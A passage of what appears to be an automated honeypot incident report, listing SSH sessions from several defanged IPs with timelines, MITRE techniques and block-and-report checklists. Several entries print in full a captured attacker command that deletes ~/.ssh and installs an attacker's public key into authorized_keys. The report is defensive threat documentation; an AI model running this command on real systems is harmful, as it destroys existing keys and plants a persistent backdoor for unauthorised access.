| `2026-04-15 08:05:24` | `cowrie.command.input` |
| `2026-04-15 08:05:24` | `cowrie.log.closed` |
| `2026-04-15 08:05:25` | `cowrie.session.params` |
| `2026-04-15 08:05:25` | `cowrie.command.input` |
| `2026-04-15 08:05:25` | `cowrie.session.file_download` |
| `2026-04-15 08:05:25` | `cowrie.log.closed` |
| `2026-04-15 08:05:25` | `cowrie.session.params` |
| `2026-04-15 08:05:25` | `cowrie.command.input` |
| `2026-04-15 08:05:25` | `cowrie.log.closed` |
| `2026-04-15 08:05:25` | `cowrie.session.params` |
| `2026-04-15 08:05:25` | `cowrie.command.input` |
| `2026-04-15 08:05:25` | `cowrie.log.closed` |
| `2026-04-15 08:05:26` | `cowrie.session.params` |
| `2026-04-15 08:05:26` | `cowrie.command.input` |
| `2026-04-15 08:05:26` | `cowrie.command.input` |
| `2026-04-15 08:05:26` | `cowrie.log.closed` |
| `2026-04-15 08:05:26` | `cowrie.session.params` |
| `2026-04-15 08:05:26` | `cowrie.command.input` |
| `2026-04-15 08:05:26` | `cowrie.log.closed` |
| `2026-04-15 08:05:26` | `cowrie.session.params` |
| `2026-04-15 08:05:26` | `cowrie.command.input` |
| `2026-04-15 08:05:27` | `cowrie.log.closed` |
| `2026-04-15 08:05:27` | `cowrie.session.params` |
| `2026-04-15 08:05:27` | `cowrie.command.input` |
| `2026-04-15 08:05:27` | `cowrie.log.closed` |
| `2026-04-15 08:05:27` | `cowrie.session.params` |
| `2026-04-15 08:05:27` | `cowrie.command.input` |
| `2026-04-15 08:05:27` | `cowrie.log.closed` |
| `2026-04-15 08:05:28` | `cowrie.session.params` |
| `2026-04-15 08:05:28` | `cowrie.command.input` |
| `2026-04-15 08:05:28` | `cowrie.log.closed` |
| `2026-04-15 08:05:28` | `cowrie.session.params` |
| `2026-04-15 08:05:28` | `cowrie.command.input` |
| `2026-04-15 08:05:28` | `cowrie.log.closed` |
| `2026-04-15 08:05:28` | `cowrie.session.params` |
| `2026-04-15 08:05:28` | `cowrie.command.input` |
| `2026-04-15 08:05:28` | `cowrie.log.closed` |
| `2026-04-15 08:05:29` | `cowrie.session.params` |
| `2026-04-15 08:05:29` | `cowrie.command.input` |
| `2026-04-15 08:05:29` | `cowrie.log.closed` |
| `2026-04-15 08:05:29` | `cowrie.session.params` |
| `2026-04-15 08:05:29` | `cowrie.command.input` |
| `2026-04-15 08:05:29` | `cowrie.log.closed` |
| `2026-04-15 08:05:30` | `cowrie.session.params` |
| `2026-04-15 08:05:30` | `cowrie.command.input` |
| `2026-04-15 08:05:30` | `cowrie.log.closed` |
| `2026-04-15 08:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204c7f1db61e

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:05 |
| **Last Seen** | 2026-04-15 08:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:05:21` | `cowrie.session.connect` |
| `2026-04-15 08:05:21` | `cowrie.client.version` |
| `2026-04-15 08:05:21` | `cowrie.client.kex` |
| `2026-04-15 08:05:22` | `cowrie.login.success` |
| `2026-04-15 08:05:22` | `cowrie.session.params` |
| `2026-04-15 08:05:22` | `cowrie.command.input` |
| `2026-04-15 08:05:22` | `cowrie.command.failed` |
| `2026-04-15 08:05:23` | `cowrie.log.closed` |
| `2026-04-15 08:05:23` | `cowrie.session.params` |
| `2026-04-15 08:05:23` | `cowrie.command.input` |
| `2026-04-15 08:05:23` | `cowrie.session.file_download` |
| `2026-04-15 08:05:23` | `cowrie.log.closed` |
| `2026-04-15 08:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f65ca1e7a6b2

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:05 |
| **Last Seen** | 2026-04-15 08:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:05:25` | `cowrie.session.connect` |
| `2026-04-15 08:05:25` | `cowrie.client.version` |
| `2026-04-15 08:05:25` | `cowrie.client.kex` |
| `2026-04-15 08:05:26` | `cowrie.login.success` |
| `2026-04-15 08:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b59b568fc8

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:07 |
| **Last Seen** | 2026-04-15 08:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:07:20` | `cowrie.session.connect` |
| `2026-04-15 08:07:20` | `cowrie.client.version` |
| `2026-04-15 08:07:21` | `cowrie.client.kex` |
| `2026-04-15 08:07:21` | `cowrie.login.success` |
| `2026-04-15 08:07:21` | `cowrie.session.params` |
| `2026-04-15 08:07:21` | `cowrie.command.input` |
| `2026-04-15 08:07:21` | `cowrie.command.failed` |
| `2026-04-15 08:07:22` | `cowrie.log.closed` |
| `2026-04-15 08:07:22` | `cowrie.session.params` |
| `2026-04-15 08:07:22` | `cowrie.command.input` |
| `2026-04-15 08:07:22` | `cowrie.session.file_download` |
| `2026-04-15 08:07:22` | `cowrie.log.closed` |
| `2026-04-15 08:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f1a3412faba

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:07 |
| **Last Seen** | 2026-04-15 08:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:07:24` | `cowrie.session.connect` |
| `2026-04-15 08:07:24` | `cowrie.client.version` |
| `2026-04-15 08:07:24` | `cowrie.client.kex` |
| `2026-04-15 08:07:25` | `cowrie.login.success` |
| `2026-04-15 08:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1d731cc933

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:07 |
| **Last Seen** | 2026-04-15 08:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:07:49` | `cowrie.session.connect` |
| `2026-04-15 08:07:49` | `cowrie.client.version` |
| `2026-04-15 08:07:49` | `cowrie.client.kex` |
| `2026-04-15 08:07:50` | `cowrie.login.success` |
| `2026-04-15 08:07:50` | `cowrie.session.params` |
| `2026-04-15 08:07:50` | `cowrie.command.input` |
| `2026-04-15 08:07:50` | `cowrie.command.failed` |
| `2026-04-15 08:07:50` | `cowrie.log.closed` |
| `2026-04-15 08:07:51` | `cowrie.session.params` |
| `2026-04-15 08:07:51` | `cowrie.command.input` |
| `2026-04-15 08:07:51` | `cowrie.session.file_download` |
| `2026-04-15 08:07:51` | `cowrie.log.closed` |
| `2026-04-15 08:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54842620ada9

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:07 |
| **Last Seen** | 2026-04-15 08:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:07:54` | `cowrie.session.connect` |
| `2026-04-15 08:07:54` | `cowrie.client.version` |
| `2026-04-15 08:07:54` | `cowrie.client.kex` |
| `2026-04-15 08:07:55` | `cowrie.login.success` |
| `2026-04-15 08:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e127da5ceccb

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:08 |
| **Last Seen** | 2026-04-15 08:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:08:08` | `cowrie.session.connect` |
| `2026-04-15 08:08:08` | `cowrie.client.version` |
| `2026-04-15 08:08:08` | `cowrie.client.kex` |
| `2026-04-15 08:08:09` | `cowrie.login.success` |
| `2026-04-15 08:08:09` | `cowrie.session.params` |
| `2026-04-15 08:08:09` | `cowrie.command.input` |
| `2026-04-15 08:08:09` | `cowrie.command.failed` |
| `2026-04-15 08:08:09` | `cowrie.log.closed` |
| `2026-04-15 08:08:10` | `cowrie.session.params` |
| `2026-04-15 08:08:10` | `cowrie.command.input` |
| `2026-04-15 08:08:10` | `cowrie.session.file_download` |
| `2026-04-15 08:08:10` | `cowrie.log.closed` |
| `2026-04-15 08:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfeee0284d2a

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:08 |
| **Last Seen** | 2026-04-15 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:08:12` | `cowrie.session.connect` |
| `2026-04-15 08:08:12` | `cowrie.client.version` |
| `2026-04-15 08:08:12` | `cowrie.client.kex` |
| `2026-04-15 08:08:13` | `cowrie.login.success` |
| `2026-04-15 08:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868f73494056

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:09 |
| **Last Seen** | 2026-04-15 08:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:09:26` | `cowrie.session.connect` |
| `2026-04-15 08:09:26` | `cowrie.client.version` |
| `2026-04-15 08:09:27` | `cowrie.client.kex` |
| `2026-04-15 08:09:28` | `cowrie.login.success` |
| `2026-04-15 08:09:28` | `cowrie.session.params` |
| `2026-04-15 08:09:28` | `cowrie.command.input` |
| `2026-04-15 08:09:28` | `cowrie.command.failed` |
| `2026-04-15 08:09:28` | `cowrie.log.closed` |
| `2026-04-15 08:09:29` | `cowrie.session.params` |
| `2026-04-15 08:09:29` | `cowrie.command.input` |
| `2026-04-15 08:09:29` | `cowrie.session.file_download` |
| `2026-04-15 08:09:29` | `cowrie.log.closed` |
| `2026-04-15 08:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab6bd477900a

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:09 |
| **Last Seen** | 2026-04-15 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:09:32` | `cowrie.session.connect` |
| `2026-04-15 08:09:32` | `cowrie.client.version` |
| `2026-04-15 08:09:32` | `cowrie.client.kex` |
| `2026-04-15 08:09:33` | `cowrie.login.success` |
| `2026-04-15 08:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c68aafe43f

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:11 |
| **Last Seen** | 2026-04-15 08:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:11:01` | `cowrie.session.connect` |
| `2026-04-15 08:11:01` | `cowrie.client.version` |
| `2026-04-15 08:11:01` | `cowrie.client.kex` |
| `2026-04-15 08:11:01` | `cowrie.login.success` |
| `2026-04-15 08:11:02` | `cowrie.session.params` |
| `2026-04-15 08:11:02` | `cowrie.command.input` |
| `2026-04-15 08:11:02` | `cowrie.command.failed` |
| `2026-04-15 08:11:02` | `cowrie.log.closed` |
| `2026-04-15 08:11:02` | `cowrie.session.params` |
| `2026-04-15 08:11:02` | `cowrie.command.input` |
| `2026-04-15 08:11:02` | `cowrie.session.file_download` |
| `2026-04-15 08:11:02` | `cowrie.log.closed` |
| `2026-04-15 08:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9211869b2c52

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:11 |
| **Last Seen** | 2026-04-15 08:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:11:05` | `cowrie.session.connect` |
| `2026-04-15 08:11:05` | `cowrie.client.version` |
| `2026-04-15 08:11:05` | `cowrie.client.kex` |
| `2026-04-15 08:11:05` | `cowrie.login.success` |
| `2026-04-15 08:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7439614109f6

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:11 |
| **Last Seen** | 2026-04-15 08:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:11:16` | `cowrie.session.connect` |
| `2026-04-15 08:11:16` | `cowrie.client.version` |
| `2026-04-15 08:11:16` | `cowrie.client.kex` |
| `2026-04-15 08:11:16` | `cowrie.login.success` |
| `2026-04-15 08:11:17` | `cowrie.session.params` |
| `2026-04-15 08:11:17` | `cowrie.command.input` |
| `2026-04-15 08:11:17` | `cowrie.command.failed` |
| `2026-04-15 08:11:17` | `cowrie.log.closed` |
| `2026-04-15 08:11:17` | `cowrie.session.params` |
| `2026-04-15 08:11:17` | `cowrie.command.input` |
| `2026-04-15 08:11:17` | `cowrie.session.file_download` |
| `2026-04-15 08:11:17` | `cowrie.log.closed` |
| `2026-04-15 08:11:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5fdbf83df13

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:11 |
| **Last Seen** | 2026-04-15 08:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:11:19` | `cowrie.session.connect` |
| `2026-04-15 08:11:19` | `cowrie.client.version` |
| `2026-04-15 08:11:20` | `cowrie.client.kex` |
| `2026-04-15 08:11:20` | `cowrie.login.success` |
| `2026-04-15 08:11:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaa487051192

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-15 08:12 |
| **Last Seen** | 2026-04-15 08:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:12:11` | `cowrie.session.connect` |
| `2026-04-15 08:12:11` | `cowrie.client.version` |
| `2026-04-15 08:12:11` | `cowrie.client.kex` |
| `2026-04-15 08:12:11` | `cowrie.login.success` |
| `2026-04-15 08:12:11` | `cowrie.session.params` |
| `2026-04-15 08:12:11` | `cowrie.command.input` |
| `2026-04-15 08:12:11` | `cowrie.command.failed` |
| `2026-04-15 08:12:11` | `cowrie.log.closed` |
| `2026-04-15 08:12:12` | `cowrie.session.params` |
| `2026-04-15 08:12:12` | `cowrie.command.input` |
| `2026-04-15 08:12:12` | `cowrie.session.file_download` |
